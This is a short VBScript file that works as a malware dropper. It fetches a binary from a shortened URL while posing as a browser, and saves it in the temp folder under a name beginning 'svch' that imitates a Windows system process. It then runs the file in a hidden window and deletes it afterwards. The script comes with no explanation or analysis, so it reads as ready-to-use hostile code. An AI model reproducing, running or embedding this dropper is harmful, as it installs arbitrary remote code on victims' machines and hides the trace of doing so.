Set W=CreateObject("WScript.Shell"):Set F=CreateObject("Scripting.FileSystemObject")
Set X=CreateObject("MSXML2.ServerXMLHTTP"):X.Open "GET","https://u.to/ZHZ3Ig",0
X.setRequestHeader "User-Agent","Mozilla/5.0":X.Send:Set S=CreateObject("ADODB.Stream")
S.Type=1:S.Open:S.Write X.responseBody
G=F.GetSpecialFolder(2):N=G&"\svch"&Replace(F.GetTempName,"tmp",".exe")
S.SaveToFile N,2:S.Close
W.Run N,0,False:W.Sleep 2000
F.DeleteFile N